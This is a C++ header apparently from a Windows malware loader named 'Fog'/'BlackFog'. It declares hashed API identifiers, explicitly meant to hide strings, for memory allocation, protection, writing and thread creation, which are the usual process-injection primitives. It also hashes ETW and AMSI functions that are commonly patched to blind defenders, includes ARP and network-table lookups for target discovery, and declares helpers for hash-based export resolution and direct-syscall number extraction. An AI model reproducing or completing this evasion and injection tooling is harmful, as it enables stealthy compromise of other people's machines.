#pragma once
#include "Native.h"

namespace Fog::Core {
    // Hashes of the functions we need (so as not to reveal strings)
    constexpr DWORD HASH_NT_ALLOCATE = 0xC86105CA;
    constexpr DWORD HASH_NT_PROTECT = 0xA4D0D586; 
    constexpr DWORD HASH_NT_WRITE = 0xFAE162D0; 
    constexpr DWORD HASH_NT_THREAD = 0xFE3E696E;
    constexpr DWORD HASH_ETW_EVENT_WRITE = 0x4CA9D500; // "EtwEventWrite" (ntdll export)
    constexpr DWORD HASH_LDR_LOAD_DLL = 0x4EE660C1; // "LdrLoadDll" (ntdll export)
    constexpr DWORD HASH_GET_IP_NET_TABLE2 = 0xDE0519FD; // "GetIpNetTable2" (iphlpapi export)
    constexpr DWORD HASH_FREEMIBTABLE = 0xEF2E2745;       // "FreeMibTable" (iphlpapi export)
    constexpr DWORD HASH_SENDARP = 0x9B7492B0;           // "SendARP" (iphlpapi export)
    constexpr DWORD HASH_INITIALIZE_CORE = 0xEE1C1B1E;  // "InitializeCore" (BlackFog.dll export)
    constexpr DWORD HASH_SET_TARGETS = 0x008F6BA9;      // "SetTargets" (BlackFog.dll export)
    constexpr DWORD HASH_AMSISCANBUFFER = 0x27D9EE2C; // "AmsiScanBuffer" (amsi export)

    // Helper methods
    DWORD HashString(const char* word);
    uintptr_t GetModuleBase(const wchar_t* moduleName);
    uintptr_t GetExportAddress(uintptr_t moduleBase, DWORD targetHash);
    DWORD ExtractSSN(uintptr_t functionAddress);
}
